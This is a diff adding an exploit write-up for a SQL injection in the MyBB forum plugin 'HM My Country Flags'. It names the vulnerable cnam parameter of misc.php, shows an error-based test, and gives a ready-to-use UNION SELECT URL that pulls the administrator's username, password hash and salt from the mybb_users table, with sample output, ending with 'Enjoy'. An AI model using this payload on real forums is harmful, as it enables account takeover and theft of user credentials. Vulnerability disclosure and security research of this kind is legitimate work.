@@ -1,0 +1,35 @@
+# Exploit title: HM My Country Flags SQL Injection
+# Author: JoinSe7en
+# Contact: join7 [+at+] riseup.net
+# Tested on: Linux
+# Category: Web Applications
+# Software link: http://mods.mybb.com/view/hm-my-country-flags
+
+HM My Country Flags has a SQL Injection vulnerability.
+If we go to a thread we'll see a country next to the users post.
+
+We'll start HTTP Live Headers and press this link to get the URL (Otherwise it's in popup box and we will not see the URL)
+
+Here we'll work some magic with the ' 
+
+http://server/forum/misc.php?action=hmflags&cnam=Belgium'&pf=5
+
+Returns:
+
+'MyBB has experienced an internal SQL error and cannot continue.
+
+SQL Error:
+    1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''Belgium''' at line 1'
+
+From here we can just perform basic UNION Based SQL Injection.
+The column count is often very big, usually around 150-180 depending on the countries available.
+
+This could be a query:
+
+http://server/forum/misc.php?action=hmflags&cnam=-Belgium'+UNION SELECT 1,group_concat(username,0x3a,password,0x3a,salt,0x3b),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164+FROM+mybb_users WHERE uid=1--+&pf=5
+
+Output:
+
+admin:018bda9eb505747441b9485b42cadab:apa2G1ge;
+
+Enjoy :3
